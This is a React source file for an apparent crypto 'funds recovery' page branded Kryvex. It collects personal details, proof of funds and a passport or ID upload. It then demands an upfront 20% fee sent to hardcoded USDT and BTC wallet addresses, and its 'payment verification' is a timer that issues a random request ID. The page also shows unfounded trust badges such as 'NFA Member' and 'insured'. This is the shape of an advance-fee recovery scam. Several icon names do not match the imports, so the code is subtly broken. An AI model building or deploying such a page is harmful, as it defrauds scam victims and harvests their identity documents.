"use client";

import { useState, useEffect, useRef } from "react";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { Label } from "@/components/ui/label";
import { useToast } from "@/components/ui/use-toast";
import {
  ClipboardCopy,
  Upload,
  CheckCircle,
  MessageCircle,
  Shield,
  Lock,
  FileCheck,
} from "lucide-react";

const steps = [
  "Wallet Info",
  "Proof of Funds",
  "Fee Calculation",
  "Payment",
  "Confirmation",
];

const KryvexRecovery = () => {
  const [currentStep, setCurrentStep] = useState(0);
  const [form, setForm] = useState({
    fullName: "",
    email: "",
    phone: "",
    platform: "",
    total: "",
    proofFile: null as File | null,
    transactionId: "",
    paymentProof: null as File | null,
    idUpload: null as File | null,
  });
  const [fee, setFee] = useState(0);
  const [net, setNet] = useState(0);
  const [requestId, setRequestId] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const { toast } = useToast();
  const proofInputRef = useRef<HTMLInputElement>(null);
  const paymentInputRef = useRef<HTMLInputElement>(null);
  const idInputRef = useRef<HTMLInputElement>(null);

  // Load from localStorage on mount
  useEffect(() => {
    const saved = localStorage.getItem("kryvex-form");
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        setForm(parsed);
      } catch {}
    }
  }, []);

  // Save to localStorage on change
  useEffect(() => {
    localStorage.setItem("kryvex-form", JSON.stringify(form));
  }, [form]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>, key: string) => {
    const file = e.target.files?.[0] ?? null;
    if (file) {
      // Validate size (10 MB)
      if (file.size > 10 * 1024 * 1024) {
        toast({ title: "File too large", description: "Max size is 10 MB", variant: "destructive" });
        return;
      }
      // Validate type
      const allowed = ["image/png", "image/jpeg", "image/jpg", "application/pdf"];
      if (!allowed.includes(file.type)) {
        toast({ title: "Invalid file type", description: "Allowed: PNG, JPG, PDF", variant: "destructive" });
        return;
      }
    }
    setForm((prev) => ({ ...prev, [key]: file }));
  };

  const validateStep = () => {
    switch (currentStep) {
      case 0:
        return (
          form.fullName.trim() &&
          form.email.trim() &&
          form.platform.trim() &&
          form.total &&
          Number(form.total) > 0
        );
      case 1:
        return form.proofFile !== null;
      case 2:
        return true;
      case 3:
        return form.transactionId.trim() || form.paymentProof !== null;
      default:
        return true;
    }
  };

  const next = () => {
    if (!validateStep()) {
      toast({ title: "Please fill all required fields", variant: "destructive" });
      return;
    }
    if (currentStep === 2) {
      const total = Number(form.total);
      const feeCalc = total * 0.2;
      setFee(feeCalc);
      setNet(total - feeCalc);
    }
    setCurrentStep((s) => s + 1);
  };

  const prev = () => setCurrentStep((s) => Math.max(s - 1, 0));

  const confirmPayment = () => {
    setIsProcessing(true);
    setTimeout(() => {
      const id = Math.random().toString(36).substring(2, 10).toUpperCase();
      setRequestId(id);
      setIsProcessing(false);
      setCurrentStep(4);
    }, 1500);
  };

  const copyAddress = (addr: string) => {
    navigator.clipboard.writeText(addr);
    toast({ title: "Copied to clipboard" });
  };

  const renderStep = () => {
    switch (currentStep) {
      case 0:
        return (
          <Card className="w-full max-w-md mx-auto bg-[#141824]/80 backdrop-blur-lg border border-[#262B3B]">
            <CardHeader>
              <CardTitle className="text-white">Wallet Information</CardTitle>
            </CardHeader>
            <CardContent className="grid gap-4">
              <div className="grid gap-2">
                <Label htmlFor="fullName" className="text-gray-300">Full Name</Label>
                <Input id="fullName" name="fullName" value={form.fullName} onChange={handleChange} required className="bg-[#0B0E17] border-[#262B3B] text-white" />
              </div>
              <div className="grid gap-2">
                <Label htmlFor="email" className="text-gray-300">Email</Label>
                <Input id="email" name="email" type="email" value={form.email} onChange={handleChange} required className="bg-[#0B0E17] border-[#262B3B] text-white" />
              </div>
              <div className="grid gap-2">
                <Label htmlFor="phone" className="text-gray-300">Phone (optional)</Label>
                <Input id="phone" name="phone" value={form.phone} onChange={handleChange} className="bg-[#0B0E17] border-[#262B3B] text-white" />
              </div>
              <div className="grid gap-2">
                <Label htmlFor="platform" className="text-gray-300">Original Platform</Label>
                <Input id="platform" name="platform" value={form.platform} onChange={handleChange} required className="bg-[#0B0E17] border-[#262B3B] text-white" />
              </div>
              <div className="grid gap-2">
                <Label htmlFor="total" className="text-gray-300">Total Amount (USDT)</Label>
                <Input id="total" name="total" type="number" min="0" step="0.01" value={form.total} onChange={handleChange} required className="bg-[#0B0E17] border-[#262B3B] text-white" />
              </div>
            </CardContent>
            <div className="p-4 flex justify-end">
              <Button onClick={next} className="bg-[#00D4FF] hover:bg-[#00B8E6] text-black">Next</Button>
            </div>
          </Card>
        );
      case 1:
        return (
          <Card className="w-full max-w-md mx-auto bg-[#141824]/80 backdrop-blur-lg border border-[#262B3B]">
            <CardHeader>
              <CardTitle className="text-white">Proof of Funds</CardTitle>
            </CardHeader>
            <CardContent>
              <label
                className="flex flex-col items-center justify-center border-2 border-dashed border-[#262B3B] rounded-lg p-6 cursor-pointer hover:border-[#00D4FF] transition-colors"
                onClick={() => proofInputRef.current?.click()}
              >
                <UploadIcon className="h-12 w-12 text-gray-400" />
                <span className="mt-2 text-sm text-gray-500">Drag & drop or click to upload</span>
                <span className="text-xs text-gray-500">PNG, JPG, PDF (max 10 MB)</span>
                <input
                  type="file"
                  accept="image/png,image/jpeg,image/jpg,application/pdf"
                  ref={proofInputRef}
                  onChange={(e) => handleFile(e, "proofFile")}
                  className="hidden"
                />
              </label>
              {form.proofFile && (
                <div className="mt-4 flex items-center space-x-2">
                  <FileCheckIcon className="h-5 w-5 text-green-400" />
                  <span className="text-sm text-gray-300">{form.proofFile.name}</span>
                </div>
              )}
            </CardContent>
            <div className="p-4 flex justify-between">
              <Button variant="outline" onClick={prev} className="border-[#262B3B] text-gray-300">Back</Button>
              <Button onClick={next} className="bg-[#00D4FF] hover:bg-[#00B8E6] text-black">Verify & Calculate</Button>
            </div>
          </Card>
        );
      case 2:
        return (
          <Card className="w-full max-w-md mx-auto bg-[#141824]/80 backdrop-blur-lg border border-[#262B3B]">
            <CardHeader>
              <CardTitle className="text-white">Fee Calculation</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex justify-between">
                <span className="text-gray-300">Total funds:</span>
                <span className="font-semibold text-white">{Number(form.total).toLocaleString()} USDT</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Fee (20%):</span>
                <span className="font-semibold text-[#F5A623]">{fee.toLocaleString()} USDT</span>
              </div>
              <div className="flex justify-between border-t border-[#262B3B] pt-2">
                <span className="text-gray-300">You will receive:</span>
                <span className="font-bold text-[#00D4FF]">{net.toLocaleString()} USDT</span>
              </div>
              <p className="text-sm text-gray-400">
                To proceed with withdrawal & fund recovery, you must pay the 20% fee first.
              </p>
            </CardContent>
            <div className="p-4 flex justify-between">
              <Button variant="outline" onClick={prev} className="border-[#262B3B] text-gray-300">Back</Button>
              <Button onClick={next} className="bg-[#00D4FF] hover:bg-[#00B8E6] text-black">Next</Button>
            </div>
          </Card>
        );
      case 3:
        return (
          <Card className="w-full max-w-md mx-auto bg-[#141824]/80 backdrop-blur-lg border border-[#262B3B]">
            <CardHeader>
              <CardTitle className="text-white">Payment</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-2">
                <Label className="text-gray-300">USDT (TRC20)</Label>
                <div className="flex items-center space-x-2">
                  <span className="flex-1 text-sm text-gray-300 truncate">TYdFjAfhWL9DjaDBAe5LS7zUjBqpYGkRYB</span>
                  <Button size="sm" variant="ghost" onClick={() => copyAddress("TYdFjAfhWL9DjaDBAe5LS7zUjBqpYGkRYB")}>
                    <ClipboardCopyIcon className="h-4 w-4" />
                  </Button>
                </div>
              </div>
              <div className="grid gap-2">
                <Label className="text-gray-300">USDT (ERC20)</Label>
                <div className="flex items-center space-x-2">
                  <span className="flex-1 text-sm text-gray-300 truncate">0xd5fffaa3740af39c265563aec8c14bd08c05e838</span>
                  <Button size="sm" variant="ghost" onClick={() => copyAddress("0xd5fffaa3740af39c265563aec8c14bd08c05e838")}>
                    <ClipboardCopyIcon className="h-4 w-4" />
                  </Button>
                </div>
              </div>
              <div className="grid gap-2">
                <Label className="text-gray-300">BTC (Bitcoin)</Label>
                <div className="flex items-center space-x-2">
                  <span className="flex-1 text-sm text-gray-300 truncate">1FTUbAx5QNTWbxyerMPpxRbwqH3XnvwKQb</span>
                  <Button size="sm" variant="ghost" onClick={() => copyAddress("1FTUbAx5QNTWbxyerMPpxRbwqH3XnvwKQb")}>
                    <ClipboardCopyIcon className="h-4 w-4" />
                  </Button>
                </div>
              </div>
              <div className="grid gap-2">
                <Label htmlFor="transactionId" className="text-gray-300">Transaction ID (required)</Label>
                <Input id="transactionId" name="transactionId" value={form.transactionId} onChange={handleChange} required className="bg-[#0B0E17] border-[#262B3B] text-white" />
              </div>
              <div className="grid gap-2">
                <Label className="text-gray-300">Proof of Payment (image/PDF)</Label>
                <label
                  className="flex flex-col items-center justify-center border-2 border-dashed border-[#262B3B] rounded-lg p-4 cursor-pointer hover:border-[#00D4FF] transition-colors"
                  onClick={() => paymentInputRef.current?.click()}
                >
                  <UploadIcon className="h-10 w-10 text-gray-400" />
                  <span className="mt-2 text-sm text-gray-500">Drag & drop or click to upload</span>
                  <input
                    type="file"
                    accept="image/png,image/jpeg,image/jpg,application/pdf"
                    ref={paymentInputRef}
                    onChange={(e) => handleFile(e, "paymentProof")}
                    className="hidden"
                  />
                </label>
                {form.paymentProof && (
                  <div className="mt-2 flex items-center space-x-2">
                    <FileCheckIcon className="h-5 w-5 text-green-400" />
                    <span className="text-sm text-gray-300">{form.paymentProof.name}</span>
                  </div>
                )}
              </div>
              <div className="grid gap-2">
                <Label className="text-gray-300">KYC / ID Upload (Required for fund release)</Label>
                <label
                  className="flex flex-col items-center justify-center border-2 border-dashed border-[#262B3B] rounded-lg p-4 cursor-pointer hover:border-[#00D4FF] transition-colors"
                  onClick={() => idInputRef.current?.click()}
                >
                  <UploadIcon className="h-10 w-10 text-gray-400" />
                  <span className="mt-2 text-sm text-gray-500">Government ID or Passport</span>
                  <input
                    type="file"
                    accept="image/png,image/jpeg,image/jpg,application/pdf"
                    ref={idInputRef}
                    onChange={(e) => handleFile(e, "idUpload")}
                    className="hidden"
                  />
                </label>
                {form.idUpload && (
                  <div className="mt-2 flex items-center space-x-2">
                    <FileCheckIcon className="h-5 w-5 text-green-400" />
                    <span className="text-sm text-gray-300">{form.idUpload.name}</span>
                  </div>
                )}
              </div>
            </CardContent>
            <div className="p-4 flex justify-between">
              <Button variant="outline" onClick={prev} className="border-[#262B3B] text-gray-300">Back</Button>
              <Button onClick={confirmPayment} disabled={isProcessing} className="bg-[#00D4FF] hover:bg-[#00B8E6] text-black">
                {isProcessing ? "Processing…" : "Confirm Payment"}
              </Button>
            </div>
          </Card>
        );
      case 4:
        return (
          <Card className="w-full max-w-md mx-auto bg-[#141824]/80 backdrop-blur-lg border border-[#262B3B] text-center">
            <CardHeader>
              <CheckCircleIcon className="mx-auto h-16 w-16 text-green-500" />
              <CardTitle className="text-white mt-4">Payment Verification Initiated</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-gray-300 mb-4">
                ✅ Your payment has been submitted for verification.
              </p>
              <p className="text-gray-300 mb-4">
                Click below to create your Kryvex account and receive your funds for trading or withdrawal.
              </p>
              <Button
                className="bg-[#00D4FF] hover:bg-[#00B8E6] text-black"
                onClick={() => window.open("https://www.kryvextrading.com/", "_blank")}
              >
                Go to Kryvex Trading →
              </Button>
              <div className="mt-6 p-4 border border-[#262B3B] rounded-lg bg-[#0B0E17]">
                <p className="text-sm text-gray-400">Your Request ID</p>
                <p className="text-lg font-mono text-[#00D4FF]">{requestId}</p>
              </div>
            </CardContent>
          </Card>
        );
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-[#0B0E17] flex flex-col items-center py-8 px-4">
      <div className="w-full max-w-2xl mb-8">
        <h1 className="text-3xl font-bold text-white text-center mb-2">Kryvex Funds Recovery System</h1>
        <p className="text-center text-gray-400 mb-6">
          Migrate funds from any platform to Kryvex – secure, insured, fast.
        </p>
        <Progress value={(currentStep + 1) * 20} className="h-2 bg-[#262B3B]" />
        <div className="flex justify-between mt-2 text-xs text-gray-400">
          {steps.map((s, i) => (
            <span key={s} className={i <= currentStep ? "text-[#00D4FF]" : ""}>
              {s}
            </span>
          ))}
        </div>
      </div>

      {renderStep()}

      {/* Security badges */}
      <div className="mt-8 flex flex-wrap justify-center gap-4 text-xs text-gray-500">
        <div className="flex items-center space-x-1">
          <ShieldIcon className="h-4 w-4 text-[#00D4FF]" />
          <span>SSL Secure</span>
        </div>
        <div className="flex items-center space-x-1">
          <LockIcon className="h-4 w-4 text-[#00D4FF]" />
          <span>256-bit Encryption</span>
        </div>
        <div className="flex items-center space-x-1">
          <FileCheckIcon className="h-4 w-4 text-[#00D4FF]" />
          <span>NFA Member</span>
        </div>
      </div>

      {/* Live support widget */}
      <button
        className="fixed bottom-6 right-6 bg-[#00D4FF] hover:bg-[#00B8E6] text-black p-3 rounded-full shadow-lg transition-transform hover:scale-105"
        onClick={() => toast({ title: "Live support is not available in demo mode" })}
      >
        <MessageCircleIcon className="h-6 w-6" />
      </button>
    </div>
  );
};

export default KryvexRecovery;
